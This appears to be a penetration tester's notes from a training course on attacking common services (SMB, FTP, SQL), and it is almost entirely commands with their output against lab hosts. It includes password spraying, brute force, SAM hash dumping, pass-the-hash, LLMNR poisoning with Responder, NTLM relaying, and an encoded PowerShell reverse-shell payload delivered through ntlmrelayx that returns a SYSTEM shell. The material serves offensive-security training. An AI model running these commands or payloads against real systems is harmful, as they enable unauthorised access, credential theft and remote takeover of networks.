
## Attacking Common Services   
#### Interacting with Common Services
```
Windows CMD - DIR

C:\htb> dir \\192.168.220.129\Finance\

Volume in drive \\192.168.220.129\Finance has no label.
Volume Serial Number is ABCD-EFAA

Directory of \\192.168.220.129\Finance

02/23/2022  11:35 AM    <DIR>          Contracts
               0 File(s)          4,096 bytes
               1 Dir(s)  15,207,469,056 bytes free
```
```
Windows CMD - Net Use
  Interacting with Common Services
C:\htb> net use n: \\192.168.220.129\Finance

The command completed successfully.
```
```
C:\htb> net use n: \\192.168.220.129\Finance /user:plaintext Password123

The command completed successfully.
```
```
Windows CMD - DIR
  Interacting with Common Services
C:\htb> dir n: /a-d /s /b | find /c ":\"

29302

```
```
  Interacting with Common Services
dir n: /a-d /s /b | find /c ":\"
```
```
Syntax	Description
*   dir	      Application
*   n:	      Directory or drive to search
*   /a-d	    /a is the attribute and -d means not directories
*   /s	      Displays files in a specified directory and all subdirectories
*   /b	      Uses bare format (no heading information or summary)

The following command | find /c ":\\" process the output of dir n: /a-d /s /b to count how many files exist in the directory and subdirectories. You can use dir /? to see the full help. Searching through 29,302 files is time consuming, scripting and command line utilities can help us speed up the search. With dir we can search for specific names in files such as:

*  cred
*  password
*  users
*  secrets
*  key
*  Common File Extensions for source code such as: .cs, .c, .go, .java, .php, .asp, .aspx, .html.

```
```
  Interacting with Common Services
C:\htb>dir n:\*cred* /s /b

n:\Contracts\private\credentials.txt


C:\htb>dir n:\*secret* /s /b

n:\Contracts\private\secret.txt
```
```
Windows CMD - Findstr
  Interacting with Common Services
c:\htb>findstr /s /i cred n:\*.*

n:\Contracts\private\secret.txt:file with all credentials
n:\Contracts\private\credentials.txt:admin:SecureCredentials!
```
```
Windows PowerShell
  Interacting with Common Services
PS C:\htb> Get-ChildItem \\192.168.220.129\Finance\

    Directory: \\192.168.220.129\Finance

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         2/23/2022   3:27 PM                Contracts
```
```
Interacting with Common Services
PS C:\htb> New-PSDrive -Name "N" -Root "\\192.168.220.129\Finance" -PSProvider "FileSystem"

Name           Used (GB)     Free (GB) Provider      Root                                               CurrentLocation
----           ---------     --------- --------      ----                                               ---------------
N                                      FileSystem    \\192.168.220.129\Finance
```
```
Windows PowerShell - PSCredential Object
  Interacting with Common Services
PS C:\htb> $username = 'plaintext'
PS C:\htb> $password = 'Password123'
PS C:\htb> $secpassword = ConvertTo-SecureString $password -AsPlainText -Force
PS C:\htb> $cred = New-Object System.Management.Automation.PSCredential $username, $secpassword
PS C:\htb> New-PSDrive -Name "N" -Root "\\192.168.220.129\Finance" -PSProvider "FileSystem" -Credential $cred

Name           Used (GB)     Free (GB) Provider      Root                                                              CurrentLocation
----           ---------     --------- --------      ----                                                              ---------------
N                                      FileSystem    \\192.168.220.129\Finance
```
```
Windows PowerShell - GCI
  Interacting with Common Services
PS C:\htb> N:
PS N:\> (Get-ChildItem -File -Recurse | Measure-Object).Count

29302
```
```
Interacting with Common Services
PS C:\htb> Get-ChildItem -Recurse -Path N:\ -Include *cred* -File

    Directory: N:\Contracts\private

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         2/23/2022   4:36 PM             25 credentials.txt
```
```
Windows PowerShell - Select-String
  Interacting with Common Services
PS C:\htb> Get-ChildItem -Recurse -Path N:\ | Select-String "cred" -List

N:\Contracts\private\secret.txt:1:file with all credentials
N:\Contracts\private\credentials.txt:1:admin:SecureCredentials!
```
```
  Interacting with Common Services
mdmithu@htb[/htb]$ mount -t cifs //192.168.220.129/Finance /mnt/Finance -o credentials=/path/credentialfile
```
```
CredentialFile
Code: txt
username=plaintext
password=Password123
domain=.
```
```
Linux - Find
  Interacting with Common Services
mdmithu@htb[/htb]$ find /mnt/Finance/ -name *cred*

/mnt/Finance/Contracts/private/credentials.txt
```
```
Interacting with Common Services
mdmithu@htb[/htb]$ grep -rn /mnt/Finance/ -ie cred

/mnt/Finance/Contracts/private/credentials.txt:1:admin:SecureCredentials!
/mnt/Finance/Contracts/private/secret.txt:1:file with all credentials
```
```
Linux - Install Evolution
  Interacting with Common Services
mdmithu@htb[/htb]$ sudo apt-get install evolution
...SNIP...
Note: If an error 
```
```
Linux - SQSH
  Interacting with Common Services
mdmithu@htb[/htb]$ sqsh -S 10.129.20.13 -U username -P Password123
```
```
Windows - SQLCMD
  Interacting with Common Services
C:\htb> sqlcmd -S 10.129.20.13 -U username -P Password123
```
```
Linux - MySQL
  Interacting with Common Services
mdmithu@htb[/htb]$ mysql -u username -pPassword123 -h 10.129.20.13
```
```
Windows - MySQL
  Interacting with Common Services
C:\htb> mysql.exe -u username -pPassword123 -h 10.129.20.13

```
```
Install dbeaver
  Interacting with Common Services
mdmithu@htb[/htb]$ sudo dpkg -i dbeaver-<version>.deb
```
```
Interacting with Common Services
mdmithu@htb[/htb]$ dbeaver &
```
```
## Tools to Interact with Common Services
*  SMB	                FTP	          Email	              Databases
*  smbclient	        ftp	          Thunderbird	        mssql-cli
*  CrackMapExec	        lftp	        Claws	              mycli
*  SMBMap	            ncftp	        Geary	              mssqlclient.py
*  Impacket	            filezilla	    MailSpring	        dbeaver
*  psexec.py	        crossftp	    mutt	              MySQL Workbench
*  smbexec.py		                      mailutils	          SQL Server Management Studio or SSMS
*  sendEmail	
*  swaks	
*  sendmail
```
## Attacking FTP


```
Nmap
  Attacking FTP
mdmithu@htb[/htb]$ sudo nmap -sC -sV -p 21 192.168.2.142 

Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-10 22:04 EDT
Nmap scan report for 192.168.2.142
Host is up (0.00054s latency).

PORT   STATE SERVICE
21/tcp open  ftp
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--   1 1170     924            31 Mar 28  2001 .banner
| d--x--x--x   2 root     root         1024 Jan 14  2002 bin
| d--x--x--x   2 root     root         1024 Aug 10  1999 etc
| drwxr-srwt   2 1170     924          2048 Jul 19 18:48 incoming [NSE: writeable]
| d--x--x--x   2 root     root         1024 Jan 14  2002 lib
| drwxr-sr-x   2 1170     924          1024 Aug  5  2004 pub
|_Only 6 shown. Use --script-args ftp-anon.maxlist=-1 to see all.
```
```
Anonymous Authentication
  Attacking FTP
mdmithu@htb[/htb]$ ftp 192.168.2.142    
                     
Connected to 192.168.2.142.
220 (vsFTPd 2.3.4)
Name (192.168.2.142:kali): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0               9 Aug 12 16:51 test.txt
226 Directory send OK.
```
```
Brute Forcing with Medusa
  Attacking FTP
mdmithu@htb[/htb]$ medusa -u fiona -P /usr/share/wordlists/rockyou.txt -h 10.129.203.7 -M ftp 
                                                             
Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>                                                      
ACCOUNT CHECK: [ftp] Host: 10.129.203.7 (1 of 1, 0 complete) User: fiona (1 of 1, 0 complete) Password: 123456 (1 of 14344392 complete)
ACCOUNT CHECK: [ftp] Host: 10.129.203.7 (1 of 1, 0 complete) User: fiona (1 of 1, 0 complete) Password: 12345 (2 of 14344392 complete)
ACCOUNT CHECK: [ftp] Host: 10.129.203.7 (1 of 1, 0 complete) User: fiona (1 of 1, 0 complete) Password: 123456789 (3 of 14344392 complete)
ACCOUNT FOUND: [ftp] Host: 10.129.203.7 User: fiona Password: family [SUCCESS]
```
```
Attacking FTP
mdmithu@htb[/htb]$ nmap -Pn -v -n -p80 -b anonymous:password@10.10.110.213 172.17.0.2

Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-27 04:55 EDT
Resolved FTP bounce attack proxy to 10.10.110.213 (10.10.110.213).
Attempting connection to ftp://anonymous:password@10.10.110.213:21
Connected:220 (vsFTPd 3.0.3)
Login credentials accepted by FTP server!
Initiating Bounce Scan at 04:55
FTP command misalignment detected ... correcting.
Completed Bounce Scan at 04:55, 0.54s elapsed (1 total ports)
Nmap scan report for 172.17.0.2
Host is up.

PORT   STATE  SERVICE
80/tcp open http

<SNIP>
```
### Latest FTP Vulnerabilities

```
CoreFTP Exploitation
  Latest FTP Vulnerabilities
mdmithu@htb[/htb]$ curl -k -X PUT -H "Host: <IP>" --basic -u <username>:<password> --data-binary "PoC." --path-as-is https://<IP>/../../../../../../whoops
```
```
Target System
  Latest FTP Vulnerabilities
C:\> type C:\whoops

PoC.
```
## Attacking SMB

```
  Attacking SMB
mdmithu@htb[/htb]$ sudo nmap 10.129.14.128 -sV -sC -p139,445

Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-19 15:15 CEST
Nmap scan report for 10.129.14.128
Host is up (0.00024s latency).

PORT    STATE SERVICE     VERSION
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2
MAC Address: 00:00:00:00:00:00 (VMware)

Host script results:
|_nbstat: NetBIOS name: HTB, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-09-19T13:16:04
|_  start_date: N/A
```
```
Attacking SMB
mdmithu@htb[/htb]$ smbclient -N -L //10.129.14.128

        Sharename       Type      Comment
        -------      --     -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        notes           Disk      CheckIT
        IPC$            IPC       IPC Service (DEVSM)
SMB1 disabled no workgroup available
```
```
Attacking SMB
mdmithu@htb[/htb]$ smbmap -H 10.129.14.128

[+] IP: 10.129.14.128:445     Name: 10.129.14.128                                   
        Disk                                                    Permissions     Comment
        --                                                   ---------    -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       IPC Service (DEVSM)
        notes                                                   READ, WRITE     CheckIT
```
```
Attacking SMB
mdmithu@htb[/htb]$ smbmap -H 10.129.14.128 -r notes

[+] Guest session       IP: 10.129.14.128:445    Name: 10.129.14.128                           
        Disk                                                    Permissions     Comment
        --                                                   ---------    -------
        notes                                                   READ, WRITE
        .\notes\*
        dr--r--r               0 Mon Nov  2 00:57:44 2020    .
        dr--r--r               0 Mon Nov  2 00:57:44 2020    ..
        dr--r--r               0 Mon Nov  2 00:57:44 2020    LDOUJZWBSG
        fw--w--w             116 Tue Apr 16 07:43:19 2019    note.txt
        fr--r--r               0 Fri Feb 22 07:43:28 2019    SDT65CB.tmp
        dr--r--r               0 Mon Nov  2 00:54:57 2020    TPLRNSMWHQ
        dr--r--r               0 Mon Nov  2 00:56:51 2020    WDJEQFZPNO
        dr--r--r               0 Fri Feb 22 07:44:02 2019    WindowsImageBackup
```
```
  Attacking SMB
mdmithu@htb[/htb]$ smbmap -H 10.129.14.128 --download "notes\note.txt"

[+] Starting download: notes\note.txt (116 bytes)
[+] File output to: /htb/10.129.14.128-notes_note.txt
```
```
Attacking SMB
mdmithu@htb[/htb]$ smbmap -H 10.129.14.128 --upload test.txt "notes\test.txt"

[+] Starting upload: test.txt (20 bytes)
[+] Upload complete.
```
```
Attacking SMB
mdmithu@htb[/htb]$ rpcclient -U'%' 10.10.110.17

rpcclient $> enumdomusers

user:[mhope] rid:[0x641]
user:[svc-ata] rid:[0xa2b]
user:[svc-bexec] rid:[0xa2c]
user:[roleary] rid:[0xa36]
user:[smorgan] rid:[0xa37]
```
```
Attacking SMB
mdmithu@htb[/htb]$ git clone https://github.com/CiscoCXSecurity/enum4linux
mdmithu@htb[/htb]$ ./enum4linux-ng.py 10.10.11.45 -A -C

ENUM4LINUX - next generation

 ==========================
|    Target Information    |
 ==========================
[*] Target ........... 10.10.11.45
[*] Username ......... ''
[*] Random Username .. 'noyyglci'
[*] Password ......... ''

 ====================================
|    Service Scan on 10.10.11.45     |
 ====================================
[*] Checking LDAP (timeout: 5s)
[-] Could not connect to LDAP on 389/tcp: connection refused
[*] Checking LDAPS (timeout: 5s)
[-] Could not connect to LDAPS on 636/tcp: connection refused
[*] Checking SMB (timeout: 5s)
[*] SMB is accessible on 445/tcp
[*] Checking SMB over NetBIOS (timeout: 5s)
[*] SMB over NetBIOS is accessible on 139/tcp

 ===================================================                            
|    NetBIOS Names and Workgroup for 10.10.11.45    |
 ===================================================                                                                                         
[*] Got domain/workgroup name: WORKGROUP
[*] Full NetBIOS names information:
- WIN-752039204 <00> -          B <ACTIVE>  Workstation Service
- WORKGROUP     <00> -          B <ACTIVE>  Workstation Service
- WIN-752039204 <20> -          B <ACTIVE>  Workstation Service
- MAC Address = 00-0C-29-D7-17-DB
...
 ========================================
|    SMB Dialect Check on 10.10.11.45    |
 ========================================

<SNIP>
```
```
Attacking SMB
mdmithu@htb[/htb]$ crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!' --local-auth

SMB         10.10.110.17 445    WIN7BOX  [*] Windows 10.0 Build 18362 (name:WIN7BOX) (domain:WIN7BOX) (signing:False) (SMBv1:False)
SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\Administrator:Company01! STATUS_LOGON_FAILURE 
SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\jrodriguez:Company01! STATUS_LOGON_FAILURE 
SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\admin:Company01! STATUS_LOGON_FAILURE 
SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\eperez:Company01! STATUS_LOGON_FAILURE 
SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\amone:Company01! STATUS_LOGON_FAILURE 
SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\fsmith:Company01! STATUS_LOGON_FAILURE 
SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\tcrash:Company01! STATUS_LOGON_FAILURE 

<SNIP>

SMB         10.10.110.17 445    WIN7BOX  [+] WIN7BOX\jurena:Company01! (Pwn3d!) 
```
```
Attacking SMB
mdmithu@htb[/htb]$ impacket-psexec administrator:'Password123!'@10.10.110.17

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Requesting shares on 10.10.110.17.....
[*] Found writable share ADMIN$
[*] Uploading file EHtJXgng.exe
[*] Opening SVCManager on 10.10.110.17.....
[*] Creating service nbAc on 10.10.110.17.....
[*] Starting service nbAc.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.19041.1415]
(c) Microsoft Corporation. All rights reserved.


C:\Windows\system32>whoami && hostname

nt authority\system
WIN7BOX
```
```
Attacking SMB
mdmithu@htb[/htb]$ crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec

SMB         10.10.110.17 445    WIN7BOX  [*] Windows 10.0 Build 19041 (name:WIN7BOX) (domain:.) (signing:False) (SMBv1:False)
SMB         10.10.110.17 445    WIN7BOX  [+] .\Administrator:Password123! (Pwn3d!)
SMB         10.10.110.17 445    WIN7BOX  [+] Executed command via smbexec
SMB         10.10.110.17 445    WIN7BOX  nt authority\system
```
```
Attacking SMB
mdmithu@htb[/htb]$ crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users

SMB         10.10.110.17 445    WIN7BOX  [*] Windows 10.0 Build 18362 (name:WIN7BOX) (domain:WIN7BOX) (signing:False) (SMBv1:False)
SMB         10.10.110.17 445    WIN7BOX  [+] WIN7BOX\administrator:Password123! (Pwn3d!)
SMB         10.10.110.17 445    WIN7BOX  [+] Enumerated loggedon users
SMB         10.10.110.17 445    WIN7BOX  WIN7BOX\Administrator             logon_server: WIN7BOX
SMB         10.10.110.17 445    WIN7BOX  WIN7BOX\jurena                    logon_server: WIN7BOX
SMB         10.10.110.21 445    WIN10BOX  [*] Windows 10.0 Build 19041 (name:WIN10BOX) (domain:WIN10BOX) (signing:False) (SMBv1:False)
SMB         10.10.110.21 445    WIN10BOX  [+] WIN10BOX\Administrator:Password123! (Pwn3d!)
SMB         10.10.110.21 445    WIN10BOX  [+] Enumerated loggedon users
SMB         10.10.110.21 445    WIN10BOX  WIN10BOX\demouser                logon_server: WIN10BOX
```
```
Attacking SMB
mdmithu@htb[/htb]$ crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam

SMB         10.10.110.17 445    WIN7BOX  [*] Windows 10.0 Build 18362 (name:WIN7BOX) (domain:WIN7BOX) (signing:False) (SMBv1:False)
SMB         10.10.110.17 445    WIN7BOX  [+] WIN7BOX\administrator:Password123! (Pwn3d!)
SMB         10.10.110.17 445    WIN7BOX  [+] Dumping SAM hashes
SMB         10.10.110.17 445    WIN7BOX  Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
SMB         10.10.110.17 445    WIN7BOX  Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.10.110.17 445    WIN7BOX  DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.10.110.17 445    WIN7BOX  WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:5717e1619e16b9179ef2e7138c749d65:::
SMB         10.10.110.17 445    WIN7BOX  jurena:1001:aad3b435b51404eeaad3b435b51404ee:209c6174da490caeb422f3fa5a7ae634:::
SMB         10.10.110.17 445    WIN7BOX  demouser:1002:aad3b435b51404eeaad3b435b51404ee:4c090b2a4a9a78b43510ceec3a60f90b:::
SMB         10.10.110.17 445    WIN7BOX  [+] Added 6 SAM hashes to the database
```
```
Attacking SMB
mdmithu@htb[/htb]$ crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE

SMB         10.10.110.17 445    WIN7BOX  [*] Windows 10.0 Build 19041 (name:WIN7BOX) (domain:WIN7BOX) (signing:False) (SMBv1:False)
SMB         10.10.110.17 445    WIN7BOX  [+] WIN7BOX\Administrator:2B576ACBE6BCFDA7294D6BD18041B8FE (Pwn3d!)
```
```
Attacking SMB
mdmithu@htb[/htb]$ sudo responder -I ens33

                                         __               
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|              

           NBT-NS, LLMNR & MDNS Responder 3.0.6.0
               
  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C

[+] Poisoners:                
    LLMNR                      [ON]
    NBT-NS                     [ON]        
    DNS/MDNS                   [ON]   
                                                                                                                                                                                          
[+] Servers:         
    HTTP server                [ON]                                   
    HTTPS server               [ON]
    WPAD proxy                 [OFF]                                  
    Auth proxy                 [OFF]
    SMB server                 [ON]                                   
    Kerberos server            [ON]                                   
    SQL server                 [ON]                                   
    FTP server                 [ON]                                   
    IMAP server                [ON]                                   
    POP3 server                [ON]                                   
    SMTP server                [ON]                                   
    DNS server                 [ON]                                   
    LDAP server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]                                   
                                                                                   
[+] HTTP Options:                                                                  
    Always serving EXE         [OFF]                                               
    Serving EXE                [OFF]                                               
    Serving HTML               [OFF]                                               
    Upstream Proxy             [OFF]                                               

[+] Poisoning Options:                                                             
    Analyze Mode               [OFF]                                               
    Force WPAD auth            [OFF]                                               
    Force Basic Auth           [OFF]                                               
    Force LM downgrade         [OFF]                                               
    Fingerprint hosts          [OFF]                                               

[+] Generic Options:                                                               
    Responder NIC              [tun0]                                              
    Responder IP               [10.10.14.198]                                      
    Challenge set              [random]                                            
    Don't Respond To Names     ['ISATAP']                                          

[+] Current Session Variables:                                                     
    Responder Machine Name     [WIN-2TY1Z1CIGXH]   
    Responder Domain Name      [HF2L.LOCAL]                                        
    Responder DCE-RPC Port     [48162] 

[+] Listening for events... 

[*] [NBT-NS] Poisoned answer sent to 10.10.110.17 for name WORKGROUP (service: Domain Master Browser)
[*] [NBT-NS] Poisoned answer sent to 10.10.110.17 for name WORKGROUP (service: Browser Election)
[*] [MDNS] Poisoned answer sent to 10.10.110.17   for name mysharefoder.local
[*] [LLMNR]  Poisoned answer sent to 10.10.110.17 for name mysharefoder
[*] [MDNS] Poisoned answer sent to 10.10.110.17   for name mysharefoder.local
[SMB] NTLMv2-SSP Client   : 10.10.110.17
[SMB] NTLMv2-SSP Username : WIN7BOX\demouser
[SMB] NTLMv2-SSP Hash     : demouser::WIN7BOX:997b18cc61099ba2:3CC46296B0CCFC7A231D918AE1DA
```
```
Attacking SMB
mdmithu@htb[/htb]$ hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt

hashcat (v6.1.1) starting...

<SNIP>

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344386
* Bytes.....: 139921355
* Keyspace..: 14344386

ADMINISTRATOR::WIN-487IMQOIA8E:997b18cc61099ba2:3cc46296b0ccfc7a231d918ae1dae521:0101000000000000b09b51939ba6d40140c54ed46ad58e890000000002000e004e004f004d00410054004300480001000a0053004d0042003100320004000a0053004d0042003100320003000a0053004d0042003100320005000a0053004d0042003100320008003000300000000000000000000000003000004289286eda193b087e214f3e16e2be88fec5d9ff73197456c9a6861ff5b5d3330000000000000000:P@ssword
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: NetNTLMv2
Hash.Target......: ADMINISTRATOR::WIN-487IMQOIA8E:997b18cc61099ba2:3cc...000000
Time.Started.....: Mon Apr 11 16:49:34 2022 (1 sec)
Time.Estimated...: Mon Apr 11 16:49:35 2022 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1122.4 kH/s (1.34ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 75776/14344386 (0.53%)
Rejected.........: 0/75776 (0.00%)
Restore.Point....: 73728/14344386 (0.51%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: compu -> kodiak1

Started: Mon Apr 11 16:49:34 2022
Stopped: Mon Apr 11 16:49:37 2022
```
```
Attacking SMB
mdmithu@htb[/htb]$ cat /etc/responder/Responder.conf | grep 'SMB ='

SMB = Off
```
```
Attacking SMB
mdmithu@htb[/htb]$ impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

<SNIP>

[*] Running in relay mode to single host
[*] Setting up SMB Server
[*] Setting up WCF Server

[*] Servers started, waiting for connections

[*] SMBD-Thread-3: Connection from /ADMINISTRATOR@10.10.110.1 controlled, attacking target smb://10.10.110.146
[*] Authenticating against smb://10.10.110.146 as /ADMINISTRATOR SUCCEED
[*] SMBD-Thread-3: Connection from /ADMINISTRATOR@10.10.110.1 controlled, but there are no more targets left!
[*] SMBD-Thread-5: Connection from /ADMINISTRATOR@10.10.110.1 controlled, but there are no more targets left!
[*] Service RemoteRegistry is in stopped state
[*] Service RemoteRegistry is disabled, enabling it
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0xeb0432b45874953711ad55884094e9d4
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:92512f2605074cfc341a7f16e5fabf08:::
demouser:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
test:1001:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
[*] Done dumping SAM hashes for host: 10.10.110.146
[*] Stopping service RemoteRegistry
[*] Restoring the disabled state for service RemoteRegistry
```
```
Attacking SMB
mdmithu@htb[/htb]$ impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADIAMgAwAC4AMQAzADMAIgAsADkAMAAwADEAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA'
```
```
Attacking SMB
mdmithu@htb[/htb]$ nc -lvnp 9001

listening on [any] 9001 ...
connect to [10.10.110.133] from (UNKNOWN) [10.10.110.146] 52471

PS C:\Windows\system32> whoami;hostname

nt authority\system
WIN11BOX
```
## Attacking SQL Databases
```
Attacking SQL Databases
mdmithu@htb[/htb]$ nmap -Pn -sV -sC -p1433 10.10.10.125

Host discovery disabled (-Pn). All addresses will be marked 'up', and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-26 02:09 BST
Nmap scan report for 10.10.10.125
Host is up (0.0099s latency).

PORT     STATE SERVICE  VERSION
1433/tcp open  ms-sql-s Microsoft SQL Server 2017 14.00.1000.00; RTM
| ms-sql-ntlm-info: 
|   Target_Name: HTB
|   NetBIOS_Domain_Name: HTB
|   NetBIOS_Computer_Name: mssql-test
|   DNS_Domain_Name: HTB.LOCAL
|   DNS_Computer_Name: mssql-test.HTB.LOCAL
|   DNS_Tree_Name: HTB.LOCAL
|_  Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2021-08-26T01:04:36
|_Not valid after:  2051-08-26T01:04:36
|_ssl-date: 2021-08-26T01:11:58+00:00; +2m05s from scanner time.

Host script results:
|_clock-skew: mean: 2m04s, deviation: 0s, median: 2m04s
| ms-sql-info: 
|   10.10.10.125:1433: 
|     Version: 
|       name: Microsoft SQL Server 2017 RTM
|       number: 14.00.1000.00
|       Product: Microsoft SQL Server 2017
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
```
```
MySQL - Connecting to the SQL Server
  Attacking SQL Databases
mdmithu@htb[/htb]$ mysql -u julio -pPassword123 -h 10.129.20.13

Welcome to the MariaDB monitor. Commands end with ; or \g.
Your MySQL connection id is 8
Server version: 8.0.28-0ubuntu0.20.04.3 (Ubuntu)

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]>
```
```
Sqlcmd - Connecting to the SQL Server
  Attacking SQL Databases
C:\htb> sqlcmd -S SRVMSSQL -U julio -P 'MyPassword!' -y 30 -Y 30

```
```
Attacking SQL Databases
mdmithu@htb[/htb]$ sqsh -S 10.129.203.7 -U julio -P 'MyPassword!' -h

sqsh-2.5.16.1 Copyright (C) 1995-2001 Scott C. Gray
Portions Copyright (C) 2004-2014 Michael Peppler and Martin Wesdorp
This is free software with ABSOLUTELY NO WARRANTY
For more information type '\warranty'
1>
```
```
Attacking SQL Databases
mdmithu@htb[/htb]$ mssqlclient.py -p 1433 julio@10.129.203.7 

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

Password: MyPassword!

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: None, New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(WIN-02\SQLEXPRESS): Line 1: Changed database context to 'master'.
